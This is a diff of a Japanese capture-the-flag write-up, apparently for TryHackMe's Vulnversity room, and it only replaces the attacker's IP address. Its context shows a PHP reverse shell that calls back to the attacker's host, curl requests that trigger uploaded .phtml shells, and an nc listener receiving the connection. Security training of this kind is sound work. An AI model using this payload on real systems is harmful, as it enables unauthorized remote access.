@@ -652,7 +652,7 @@ Connection timed out (110)
 <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ curl http://10.48.179.41:3333/internal/uploads/shell.phtml -v
 *   Trying 10.48.179.41:3333...
-* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 59486 
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 10.10.14.5 port 59486 
 * using HTTP/1.x
 &gt; GET /internal/uploads/shell.phtml HTTP/1.1
 &gt; Host: 10.48.179.41:3333
@@ -710,7 +710,7 @@ Connection timed out (110)
 └─$ cat revshell.phtml                                               
 &lt;?php
 // IPとPORTを自分の環境に合わせて書き換える
-$ip = '192.168.205.211'; 
+$ip = '10.10.14.5'; 
 $port = 4444;
 
 $sol=proc_open('/bin/sh -i', array(0 =&gt; array('pipe', 'r'), 1 =&gt; array('pipe', 'w'), 2 =&gt; array('pipe', 'w')), $pipes);
@@ -764,7 +764,7 @@ listening on [any] 4444 ...
 <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/vulnversity]
 └─$ curl http://10.48.179.41:3333/internal/uploads/revshell.phtml -v
 *   Trying 10.48.179.41:3333...
-* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 60354 
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 10.10.14.5 port 60354 
 * using HTTP/1.x
 &gt; GET /internal/uploads/revshell.phtml HTTP/1.1
 &gt; Host: 10.48.179.41:3333
@@ -784,7 +784,7 @@ listenポートのほうにも変化がない</p>
 <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/vulnversity]
 └─$ curl http://10.48.179.41:3333/internal/uploads/test.phtml -v
 *   Trying 10.48.179.41:3333...
-* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 192.168.205.211 port 40174 
+* Established connection to 10.48.179.41 (10.48.179.41 port 3333) from 10.10.14.5 port 40174 
 * using HTTP/1.x
 &gt; GET /internal/uploads/test.phtml HTTP/1.1
 &gt; Host: 10.48.179.41:3333
@@ -887,7 +887,7 @@ shellに投げたコマンドは<code>find / -name *.txt</code>である</p>
 <pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nc -lvnp 4444     
 listening on [any] 4444 ...
-connect to [192.168.205.211] from (UNKNOWN) [10.48.151.177] 42324
+connect to [10.10.14.5] from (UNKNOWN) [10.48.151.177] 42324
 Linux ip-10-48-151-177 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
  00:28:59 up 26 min,  0 users,  load average: 0.00, 0.00, 0.05
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
